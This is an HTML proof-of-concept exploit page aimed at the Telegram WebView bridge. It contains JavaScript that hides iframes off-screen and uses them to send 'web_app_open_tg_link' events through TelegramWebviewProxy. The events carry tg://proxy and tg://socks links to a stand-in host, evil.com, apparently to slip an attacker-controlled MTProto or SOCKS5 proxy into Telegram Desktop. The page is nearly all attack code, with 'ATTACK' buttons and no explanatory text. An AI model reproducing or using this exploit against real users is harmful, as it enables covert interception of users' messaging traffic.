<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>FINAL: iframe → proxy exploit</title>
<style>
body{background:#0a0a0a;color:#ddd;font:12px monospace;margin:0;padding:10px}
h2{color:#f44;margin:0 0 4px 0}
#log{background:#111;padding:6px;max-height:300px;overflow:auto;white-space:pre-wrap;font:11px monospace}
button{display:block;width:100%;margin:3px 0;padding:8px;background:#222;color:#fff;border:1px solid #444;font:12px monospace;cursor:pointer;text-align:left}
button.fire{background:#4a0000;border-color:#f44;font-size:13px}
.green{color:#0f0}.red{color:#f44}.yellow{color:#ff0}
</style></head><body>
<h2>FINAL: Invisible iframe → tg://proxy</h2>
<div id="log">Init...</div>
<div id="btns"></div>

<script>
const L=(s,c)=>{const e=document.getElementById('log');e.innerHTML+=`<span class="${c||''}">${s}</span>\n`;e.scrollTop=e.scrollHeight;};

L(`Origin: ${location.origin}`,'yellow');
L(`Bridge: ${!!(window.TelegramWebviewProxy?.postEvent) ? 'YES':'NO'}`,'green');

function proxyAttack(method) {
  L(`\n--- ${method} ---`,'red');

  const payloads = [
    ['/proxy/?server=evil.com&port=443&secret=00aabbcc', 'tg://proxy (MTProto)'],
    ['/socks/?server=evil.com&port=1080', 'tg://socks (SOCKS5)'],
    ['/durov', 'tg://resolve?domain=durov (control)'],
  ];

  for (const [path, desc] of payloads) {
    const iframe = document.createElement('iframe');

    if (method === 'srcdoc') {
      iframe.srcdoc = `<script>
        var p = window.TelegramWebviewProxy || window.parent.TelegramWebviewProxy;
        if (p) p.postEvent('web_app_open_tg_link', {path_full: '${path}'});
      <\\/script>`;
    } else if (method === 'blank') {
      iframe.src = 'about:blank';
      iframe.onload = () => {
        try {
          const w = iframe.contentWindow;
          w.eval(`(function(){
            var p = window.TelegramWebviewProxy || window.parent.TelegramWebviewProxy;
            if (p) p.postEvent('web_app_open_tg_link', {path_full: '${path}'});
          })()`);
        } catch(e) { L(`  eval ERROR: ${e.message}`,'red'); }
      };
    }

    iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px';
    document.body.appendChild(iframe);
    L(`  TX from iframe: ${desc}`);
  }

  L('  All 3 sent. Check Telegram Desktop.','green');
}

document.getElementById('btns').innerHTML = `
  <button class="fire" onclick="proxyAttack('srcdoc')">ATTACK: srcdoc iframe → proxy/socks/durov</button>
  <button class="fire" onclick="proxyAttack('blank')">ATTACK: blank iframe → proxy/socks/durov</button>
  <button onclick="location.reload()">RELOAD</button>
`;
</script>
</body>
</html>
